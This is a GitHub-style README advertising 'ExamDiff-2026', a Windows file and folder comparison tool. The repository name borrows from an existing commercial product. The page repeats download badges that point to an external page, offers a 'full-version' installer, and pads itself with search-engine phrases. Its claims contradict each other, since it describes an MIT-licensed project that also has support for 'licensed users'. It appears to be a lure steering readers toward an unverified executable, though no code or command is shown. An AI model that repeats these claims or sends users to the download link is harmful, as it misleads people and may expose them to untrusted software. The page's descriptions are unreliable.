![preview](https://raw.githubusercontent.com/ResplandorFinal/ExamDiff-Pro-Compare-Suite/main/card_ceee3.svg)
[![Download](https://raw.githubusercontent.com/ResplandorFinal/ExamDiff-Pro-Compare-Suite/main/get_b0023.svg)](https://ResplandorFinal.github.io/ExamDiff-Pro-Compare-Suite/)

# 🔍 ExamDiff-2026 — A Comparative Lens for the Digital Curator

**Version 2026.1.0 · Desktop utility for Windows 10 & 11 · File & directory diffing reimagined**

---

## 📖 Overview

There's a quiet moment every craftsperson knows: the pause before two hands compare two halves of a split whole. ExamDiff-2026 is the software equivalent of that pause. It places two files, two folders, or two sprawling directory trees side by side and shows you, with surgical clarity, exactly where they diverge — and where they remain kin.

This repository hosts the desktop companion edition of the ExamDiff project, rebuilt from the ground up for the 2026 release cycle. Where earlier iterations of comparison tools treated the task as a mechanical diff, ExamDiff-2026 treats it as a conversation between two states of your work. Whether you're reconciling configuration files across staging and production, tracking what changed between two releases of a codebase, or simply trying to figure out which version of a document your colleague actually edited, this utility is designed to make the answer obvious at a glance.

[![Download](https://raw.githubusercontent.com/ResplandorFinal/ExamDiff-Pro-Compare-Suite/main/get_b0023.svg)](https://ResplandorFinal.github.io/ExamDiff-Pro-Compare-Suite/)

---

## ✨ Why ExamDiff-2026 Exists

Most comparison utilities fall into one of two camps. The first camp is minimal to the point of being cryptic — raw output, no context, no color, no mercy. The second camp is bloated with features you will never touch, cloud accounts you didn't ask for, and telemetry you can't disable. ExamDiff-2026 was built on a stubborn belief: **a diff tool should be powerful, private, and pleasant.** Not one of those three. All three.

This repository is the home of that philosophy. Here you will find the release artifacts, the issue tracker, the discussion threads, and the roadmap that guides the project through 2026 and beyond. It is a desktop-native experience — no browser tab required, no subscription pedestal, no dependency on whatever a remote service decides to do with your files.

---

## 🚀 Core Capabilities

### 🗂️ Dual-Pane File Comparison
Open two files and see their contents mirrored. Every insertion, deletion, and modification is highlighted with a color language that stays out of your way. Long lines wrap intelligently, whitespace differences can be toggled on or off, and syntax awareness means that comparing two source files feels like reading a careful annotation rather than decoding a telegraph.

### 🧭 Recursive Directory Comparison
Point ExamDiff-2026 at two folders and it will walk both trees in parallel, reporting which files are new, which are missing, which have changed, and which are identical. Filter by extension, by modification date, by size, or by a custom glob pattern. The result is a structural map of divergence — not just a list.

### 🎨 Three-Way and Multi-Way Views
When a simple A-versus-B comparison isn't enough, expand the canvas. Compare a base file against two or more revisions simultaneously and see the lineage of changes as a family tree rather than a set of isolated snapshots.

### 🧩 Syntax Highlighting Library
Over forty languages and markup formats are recognized out of the box, from C and Rust to YAML, JSON, TOML, Markdown, and beyond. The highlighter is tuned for diff context — it emphasizes what changed without drowning you in rainbow noise.

### 🔎 Regex and Structural Search
Search within the diff, not just across it. Regex queries, line anchors, and structural patterns help you isolate the exact region of change you care about, even in files with thousands of lines.

### 📤 Exportable Reports
Generate a human-readable or machine-parseable report of any comparison. Formats include plain text, HTML, and a structured JSON output suitable for piping into your own tooling. Reports include timestamps, file metadata, and a summary of the delta.

### 🌐 Responsive Desktop UI
The interface reshapes itself to fit the window you give it. On a wide monitor the panes sit side by side; on a narrow laptop the panes can stack, collapse, or swap with a single keystroke. The UI theme adapts to your system's light or dark preference and can be overridden with a curated set of built-in themes.

### 🗣️ Multilingual Support
The interface ships with translations for a growing list of locales, and the translation layer is open for community contributions. Menus, dialogs, tooltips, and error messages all localize — because comparing files should not require translating the tool itself.

### 🛠️ 24/7 Customer Support Channel
A persistent support desk exists for licensed users, with an average first-response window measured in minutes rather than days. Support covers installation questions, feature guidance, and bug triage — around the clock, across time zones.

### 🔐 Local-First Privacy Posture
Your files never leave your machine. There is no upload step, no cloud sync requirement, and no background network chatter beyond optional update checks. ExamDiff-2026 operates entirely on your local filesystem.

### ⚡ Snapshot and Restore Sessions
Save a comparison session — the two paths, the chosen options, the filters, the scroll positions — and reopen it later as if you never left. Useful when a reconciliation spans multiple working days.

---

## 🧱 Technical Foundations

ExamDiff-2026 is a native Windows desktop application, targeting Windows 10 (build 19041 and later) and Windows 11. It runs on both x64 and ARM64 architectures. The installer is a self-contained package — a single executable that places the application, its runtime, and its supporting libraries in the location of your choosing, then registers an uninstaller in the standard Windows control panel.

The comparison engine uses a hybrid algorithm: a Myers-style diff for line-level accuracy, augmented with a character-level refinement pass for the regions that changed. Directory traversal is parallelized up to a configurable worker count, so large trees don't stall the interface. The rendering layer is GPU-accelerated where available, with a software fallback for systems without a capable adapter.

There is no server component. There is no account layer. There is no telemetry daemon. The application is what it appears to be.

---

## 📥 Obtaining the Software

The project distributes a full-version desktop utility installer for Windows 10 and Windows 11. The installer bundles the comparison engine, the full syntax library, the multilingual resource packs, and the session manager in a single package. No additional runtime downloads are required after the initial installation.

[![Download](https://raw.githubusercontent.com/ResplandorFinal/ExamDiff-Pro-Compare-Suite/main/get_b0023.svg)](https://ResplandorFinal.github.io/ExamDiff-Pro-Compare-Suite/)

---

## 🎯 Feature List

- Dual-pane file comparison with line and character-level granularity
- Recursive directory comparison across arbitrarily deep trees
- Three-way and multi-way merge views
- Forty-plus syntax highlighting profiles
- Regex and structural search within the diff
- Exportable HTML, plain text, and JSON reports
- Responsive desktop UI with adaptive layout
- Multilingual interface with community translation support
- 24/7 customer support channel for licensed users
- Local-first privacy posture with no cloud dependency
- Session snapshot and restore
- Configurable parallel directory traversal
- GPU-accelerated rendering with software fallback
- Customizable themes for light and dark environments
- Command-line interface for scripted comparisons
- Integration with Windows Explorer context menus
- Drag-and-drop file and folder handling
- Binary file detection with hex preview
- Symlink-aware comparison for advanced workflows
- Automatic update checks with manual override

---

## 🧠 SEO-Friendly Perspective

If you have been searching for a way to compare two files on Windows 11 without uploading them to a remote service, or looking for a folder comparison tool for Windows 10 that respects your privacy, ExamDiff-2026 is engineered precisely for that need. The phrase "compare two folders recursively on Windows" describes a problem this tool was born to solve. The phrase "diff two source files locally" describes its daily bread. And the phrase "desktop diff utility for Windows 10 and 11" describes, quite literally, what you install.

The project sits in a space shared by configuration management engineers, release coordinators, technical writers, data reconciliation analysts, and curious tinkerers who simply want to know what changed. If your work involves two versions of anything — documents, source trees, configuration files, database exports, log archives — this repository likely has something for you.

---

## 🏗️ Project Structure

The repository is organized into several top-level areas. The `docs/` folder contains the user guide, the developer notes, and the translation contribution guide. The `samples/` folder contains a small corpus of file pairs and directory pairs suitable for trying out the comparison engine without assembling your own test data. The `tools/` folder contains helper scripts for packaging releases and generating localization stubs. The `tests/` folder contains the automated regression suite that runs against every candidate build. The `roadmap/` folder contains the forward-looking documents that describe where the project intends to go in 2026 and the seasons after.

Each folder has its own README with more detail. Start at the root, then wander.

---

## 🤝 Contributing

Contributions are welcome in many forms — bug reports, feature proposals, translation additions, documentation improvements, and sample data sets. Before opening a pull request, please read the contribution guidelines in `docs/CONTRIBUTING.md`. In short: keep changes focused, write clear commit messages, and be kind in code review. The project maintains a code of conduct that applies to all spaces associated with the repository, including issues, discussions, and pull requests.

If you are adding a translation, please follow the locale stub format used in existing resource files. If you are reporting a bug, please include the application version, the Windows build number, and a minimal reproduction whenever possible.

---

## 🌱 Roadmap Themes for 2026

The 2026 cycle focuses on three themes. The first is **depth over breadth** — instead of adding dozens of shallow features, the project will deepen the comparison engine, improve the accuracy of structural detection, and refine the report formats. The second is **accessibility** — keyboard navigation, screen reader compatibility, and high-contrast themes will receive concentrated attention. The third is **longevity** — the build pipeline, the dependency surface, and the release cadence will be examined with an eye toward sustainability rather than sprint velocity.

A living roadmap document in `roadmap/2026.md` tracks progress against these themes. It is updated at the start of each quarter.

---

## ⚠️ Disclaimer

ExamDiff-2026 is provided as a desktop utility for lawful file and directory comparison tasks. The authors and maintainers of this repository make no warranty, express or implied, regarding fitness for any particular purpose. Users are responsible for ensuring that their use of the software complies with all applicable laws, regulations, and organizational policies. The project does not condone, endorse, or facilitate any use that violates software licensing terms, intellectual property rights, or the terms of service of any third party.

Comparative analysis of files you do not own or do not have permission to inspect may be unlawful in your jurisdiction. You are solely responsible for determining whether your use is permitted. The maintainers disclaim all liability for damages arising from misuse.

The software is provided on an as-is basis. Support channels are offered in good faith but do not constitute a contractual guarantee of resolution times unless a separate written agreement exists.

---

## 📜 License

This project is released under the MIT License. You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the conditions stated in the license text. The full license is available in the repository.

For the canonical text of the MIT License, see the official license reference: [MIT License](https://opensource.org/licenses/MIT).

Copyright (c) 2026 the ExamDiff-2026 project contributors.

---

## 💬 A Closing Word

Two files walk into a comparison window. Only one of them is the version you remember. ExamDiff-2026 exists to tell you which. Everything else — the theming, the translations, the report formats, the support desk — is in service of that single, honest moment.

Pull up a chair. Open two folders. See the difference.

[![Download](https://raw.githubusercontent.com/ResplandorFinal/ExamDiff-Pro-Compare-Suite/main/get_b0023.svg)](https://ResplandorFinal.github.io/ExamDiff-Pro-Compare-Suite/)